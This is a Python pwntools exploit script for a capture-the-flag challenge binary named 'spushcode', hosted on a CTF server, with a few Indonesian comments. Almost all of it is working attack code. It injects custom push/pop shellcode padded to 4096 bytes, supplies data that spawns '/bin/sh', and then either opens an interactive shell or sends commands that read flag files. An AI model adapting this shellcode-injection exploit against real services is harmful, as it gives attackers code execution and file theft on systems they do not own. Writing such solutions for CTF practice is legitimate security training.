#!/usr/bin/env python3

from pwn import *
import codecs
import warnings

if args.SWARM:
    context.log_level = "ERROR"

exe = ELF("./spushcode")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
warnings.filterwarnings("ignore", category=BytesWarning)

def debug():
    if args.GDB_DEBUG:
        gdb.attach(p, '''
        c
        ''')
        pause()

def conn():
    if args.LOCAL:
        p = process([exe.path])
    else:
        p = remote("gzcli.ctf.cyberjawara.id", 33598)
    return p

p = conn()

sc = '''
push rdx
push rax
pop rdi
pop rsi
pop rdx
pop rdx
pop rdx
syscall
'''
sc = asm(sc)

#debug()
#p.sendlineafter(":", sc)
#sleep(1)
#
#sc = b'\x90'*0x80 + asm(shellcraft.sh())
#:p.sendline(sc)
payload = b"\x5b\x5b\x59\x59\x5d\x5d\x5a\x5a\x5a\x5a\x5f\x5f\x5f\x5f\x5f\x51\x5e\x53\x5c\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x0f\x05\x56\x5c\x56\x5d\x58\x5a\x5a\x5a\x5a\x5a\x5a\x5e\x5a\x53\x5f\x55\x5c\x0f\x05\x50\x5e\x5f\x5f\x5f\x58\x5a\x5a\x0f\x05"
jumlah = 4096 - len(payload)
payload += b"\x5b" * jumlah
# gdb.attach(r)

# sleep(15) # jeda untuk masuk ke gdbserver di host
p.send(payload)
p.send(b"\x02\x00\x00\x00\x00\x00\x00\x00\x00" + b"A" * 7 + b"\x01\x00\x00\x00\x00\x00\x00\x00" + b"\x28\x00\x00\x00\x00\x00\x00\x00" + b"/bin/sh\x00" + b"\x00" * 32 + b"/home/ctf/flag.txt\x00")

if not args.SWARM:
    p.interactive()
else:
    # print out the flag to stdout
    p.sendline("cat ./flag*")
    p.sendline("cat /flag*")
    p.sendline("cat /home/*/flag*")
    print(p.recvall(timeout=3), flush=True)
